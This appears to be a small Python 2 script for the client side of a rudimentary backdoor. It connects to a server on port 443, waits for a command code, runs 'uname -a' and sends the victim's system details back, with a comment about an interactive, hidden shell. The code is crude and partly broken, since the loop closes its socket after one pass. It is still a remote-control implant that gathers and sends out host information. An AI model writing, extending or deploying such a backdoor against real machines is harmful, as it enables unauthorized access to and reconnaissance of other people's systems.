import os
import socket
import subprocess
import sys

host = '127.0.0.1'
port = 443

def connect():
    # Create socket & connect to server
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print "[-] Cannot create socket."
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] Cannot connect to server."

# Interactive Shell		(For Hidden, shell=False)

def main():
   global srv_cmd
   srv_cmd = s.recv(4096)
   print "waiting for cmd."
   while True:
       if srv_cmd == "1":
           uname = os.popen("uname -a").read()
           print "Sending Results."
           try:
               s.send(uname)
               print uname
           except socket.error:
               print "Cannot Send ID"
               exit()
       elif srv_cmd == "2":
           print "[+] Target ID: "
           s.close()
           exit()
       s.close()

connect()
main()
